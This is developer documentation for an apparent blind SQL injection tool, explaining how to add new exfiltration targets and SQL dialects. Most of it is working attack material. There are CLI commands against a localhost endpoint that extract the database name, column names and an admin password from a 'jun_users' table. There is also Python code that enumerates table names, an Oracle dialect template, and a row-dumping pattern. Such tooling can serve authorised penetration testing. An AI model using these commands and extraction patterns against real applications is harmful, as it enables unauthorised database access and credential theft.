# Adding new extraction targets

The engine is agnostic about *what* it extracts. It only needs a `Target` that
can turn hypotheses into boolean SQL conditions. Adding a new thing to exfiltrate
(database name, column names, a specific field value, a count, …) means creating
a `Target` — no engine, oracle, classifier or predictor changes.

## 1. The `Target` contract

A `Target` (see `blindsqli/targets.py`) wraps a **scalar-returning SQL
subquery** and exposes hypothesis methods the engine calls:

```python
target.char_is(pos, ch)      # SUBSTRING(expr,pos,1) = 'ch'
target.char_le(pos, ch)      # SUBSTRING(expr,pos,1) <= 'ch'   (binary search)
target.substring_is(pos, s)  # SUBSTRING(expr,pos,len(s)) = 's' (sequence verify)
target.starts_with(prefix)   # expr LIKE 'prefix%'
target.length_is(n) / length_le(n) / length_ge(n)
```

All of these are implemented once, generically, on top of a `SqlDialect`. So to
add a target you usually only supply a **name** and an **expression**.

## 2. Add a target with the CLI (no code)

Any scalar subquery works via `--expr`:

```bash
# current database name
python -m blindsqli extract --url http://localhost:3000/ --param q \
  --expr "(SELECT DB_NAME())" --target-name DB_NAME

# the 2nd column of table 'jun_users'
python -m blindsqli extract --url http://localhost:3000/ --param q \
  --target-name "col" \
  --expr "(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='jun_users' ORDER BY ORDINAL_POSITION OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)"

# a field value
python -m blindsqli extract --url http://localhost:3000/ --param q \
  --target-name "secret" \
  --expr "(SELECT TOP(1) password FROM jun_users WHERE username='admin')"
```

The only requirement is that the expression returns a **single scalar** value.

## 3. Add a reusable target factory (a little code)

For targets you use often, add a factory to `blindsqli/targets.py`:

```python
def nth_table_name(dialect, n):
    expr = (f"(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            f"ORDER BY TABLE_NAME OFFSET {n} ROWS FETCH NEXT 1 ROWS ONLY)")
    return Target(name=f"TABLE_NAME[{n}]", expression=expr, dialect=dialect)
```

Then use it programmatically:

```python
from blindsqli.engine import ExfiltrationEngine
from blindsqli.oracle import BooleanOracle
from blindsqli.dialect import get_dialect
from blindsqli.targets import nth_table_name

oracle = BooleanOracle(cfg); 
engine = ExfiltrationEngine(cfg, oracle)
for n in range(10):
    print(engine.extract(nth_table_name(get_dialect("mssql"), n)).value)
```

Because the character and sequence predictors persist across calls to
`engine.extract`, extracting many similar names (e.g. `jun_users`, `jun_roles`,
`jun_projects`) gets progressively cheaper: the recurring `jun_` prefix is
proposed and verified as a single sequence.

## 4. Add a new database dialect

If your target speaks a different SQL dialect, subclass `SqlDialect` in
`blindsqli/dialect.py` and implement `substring()` and `length()` (the condition
builders and escaping are inherited):

```python
class OracleDBDialect(SqlDialect):
    name = "oracle"
    def substring(self, expr, pos, length):
        return f"SUBSTR({expr},{pos},{length})"
    def length(self, expr):
        return f"LENGTH({expr})"

register_dialect(OracleDBDialect)
```

Then pass `--dialect oracle`. Override `like_literal()` or `quote_str()` too if
the dialect needs different escaping.

## 5. Column/row enumeration pattern

To enumerate an unknown number of items, combine a count target with per-index
targets:

1. Extract `COUNT(*)` as a scalar target (numeric charset `0-9`).
2. Loop indices `0..count-1`, extracting each name/value with an `OFFSET n`
   target.

This stays entirely within the boolean/error side channel — each step is just
another scalar `Target`.
